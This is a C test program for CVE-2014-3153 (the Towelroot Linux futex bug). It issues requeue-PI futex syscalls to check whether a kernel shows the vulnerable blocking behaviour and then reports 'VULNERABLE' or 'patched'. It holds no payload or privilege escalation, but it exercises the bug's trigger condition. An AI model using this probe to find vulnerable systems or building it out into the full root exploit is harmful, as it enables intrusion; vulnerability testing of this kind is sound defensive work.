/*
 * futex_test3.c — CVE-2014-3153 (Towelroot) test with correct timeout
 *
 * CRITICAL FIX: FUTEX_WAIT_REQUEUE_PI uses ABSOLUTE timeout
 * (CLOCK_MONOTONIC), not relative. Must compute now + delta.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <time.h>
#include <linux/futex.h>

static int *futex1;
static int *futex2;
static volatile int blocker_state = 0;

static struct timespec abs_timeout(int secs) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += secs;
    return ts;
}

/* ========== Test: Does FUTEX_WAIT_REQUEUE_PI actually block? ========== */
static void *blocker_fn(void *arg) {
    struct timespec ts = abs_timeout(10);
    __sync_fetch_and_add(&blocker_state, 1); /* signal ready */

    int ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, futex2, 0);
    int err = errno;
    __sync_fetch_and_add(&blocker_state, 1); /* signal returned */

    printf("[blocker] ret=%d errno=%d (%s)\n", ret, err, strerror(err));
    if (ret == 0) {
        syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    return (void*)(long)ret;
}

static void test_blocking(void) {
    printf("\n=== Test: FUTEX_WAIT_REQUEUE_PI blocking (abs timeout) ===\n");

    /* With PI lock on futex2 */
    *futex1 = 0;
    *futex2 = 0;
    blocker_state = 0;

    int ret = syscall(SYS_futex, futex2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[main] FUTEX_LOCK_PI: ret=%d, *futex2=%d\n", ret, *futex2);

    pthread_t tid;
    pthread_create(&tid, NULL, blocker_fn, NULL);

    /* Wait for thread to signal ready */
    while (blocker_state < 1) usleep(1000);
    usleep(300000); /* 300ms for syscall entry */

    int state = blocker_state;
    printf("[main] After 300ms: state=%d (1=still blocked, 2=returned)\n", state);

    if (state == 1) {
        printf("[+] Waiter IS BLOCKING on futex1! PI requeue works.\n");

        /* Requeue from futex1 → futex2 */
        ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                      1, (void*)0, futex2, 0);
        printf("[main] CMP_REQUEUE_PI: ret=%d errno=%d (%s)\n",
               ret, errno, strerror(errno));

        if (ret > 0)
            printf("[+] Requeued %d waiters!\n", ret);

        /* Unlock to wake */
        syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    } else {
        printf("[-] Waiter did NOT block (returned immediately)\n");
        syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }

    usleep(500000);
    struct timespec jts;
    clock_gettime(CLOCK_REALTIME, &jts);
    jts.tv_sec += 5;
    pthread_timedjoin_np(tid, NULL, &jts);

    /* Without PI lock */
    printf("\n[main] Same test WITHOUT PI lock on futex2...\n");
    *futex1 = 0;
    *futex2 = 0; /* not PI locked */
    blocker_state = 0;

    pthread_create(&tid, NULL, blocker_fn, NULL);
    while (blocker_state < 1) usleep(1000);
    usleep(300000);

    state = blocker_state;
    printf("[main] After 300ms: state=%d\n", state);
    if (state == 1) {
        printf("[!!!] Blocks on non-PI target — VULNERABLE (CVE-2014-3153)!\n");

        /* Try requeue */
        ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                      1, (void*)0, futex2, 0);
        printf("[main] CMP_REQUEUE_PI (no PI lock): ret=%d errno=%d\n",
               ret, errno);
    } else {
        printf("[-] Doesn't block on non-PI target — patched\n");
    }

    syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    usleep(500000);

    clock_gettime(CLOCK_REALTIME, &jts);
    jts.tv_sec += 12;
    if (pthread_timedjoin_np(tid, NULL, &jts) != 0) {
        pthread_cancel(tid);
        pthread_join(tid, NULL);
    }
}

/* ========== Multi-waiter requeue with correct timing ========== */

static volatile int waiter_phase = 0;

static void *multi_waiter(void *arg) {
    int idx = (int)(long)arg;
    struct timespec ts = abs_timeout(15);

    __sync_fetch_and_add(&waiter_phase, 1);

    int ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, futex2, 0);
    int err = errno;

    if (ret == 0) {
        printf("[W%d] Requeued+woken OK!\n", idx);
        syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    } else if (err == 110) {
        printf("[W%d] Timed out\n", idx);
    } else {
        printf("[W%d] ret=%d err=%d (%s)\n", idx, ret, err, strerror(err));
    }

    return (void*)(long)ret;
}

static void test_multi_requeue(void) {
    printf("\n=== Test: Multi-waiter Requeue ===\n");

    *futex1 = 0;
    *futex2 = 0;
    waiter_phase = 0;

    /* Lock futex2 */
    syscall(SYS_futex, futex2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[main] futex2 PI-locked: *futex2=%d\n", *futex2);

    #define MW 4
    pthread_t tids[MW];
    for (int i = 0; i < MW; i++)
        pthread_create(&tids[i], NULL, multi_waiter, (void*)(long)i);

    /* Wait for all to enter wait */
    while (waiter_phase < MW) usleep(10000);
    usleep(500000);

    printf("[main] All %d waiters should be blocking. Requeuing...\n", MW);
    int ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                      1, (void*)(long)(MW - 1), futex2, 0);
    printf("[main] CMP_REQUEUE_PI: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret > 0) {
        printf("[+] Requeued %d waiters\n", ret);
    }

    /* Unlock to cascade-wake requeued waiters */
    printf("[main] Unlocking futex2...\n");
    for (int i = 0; i < MW + 1; i++) {
        ret = syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        if (ret < 0) break;
        usleep(50000);
    }

    /* Wake any stragglers */
    syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

    usleep(1000000);
    for (int i = 0; i < MW; i++) {
        struct timespec jts;
        clock_gettime(CLOCK_REALTIME, &jts);
        jts.tv_sec += 10;
        if (pthread_timedjoin_np(tids[i], NULL, &jts) != 0) {
            printf("[!] W%d stuck\n", i);
            pthread_cancel(tids[i]);
            pthread_join(tids[i], NULL);
        }
    }
}

int main(void) {
    printf("=== CVE-2014-3153 Futex Test v3 (abs timeout fix) ===\n");
    printf("[*] pid=%d tid=%d uid=%d\n",
           getpid(), (int)syscall(SYS_gettid), getuid());

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    printf("[*] CLOCK_MONOTONIC: %ld.%09ld\n", (long)now.tv_sec, now.tv_nsec);

    futex1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    futex2 = (int*)((char*)futex1 + 128);

    test_blocking();
    test_multi_requeue();

    printf("\n=== Done ===\n");
    munmap(futex1, 4096);
    return 0;
}
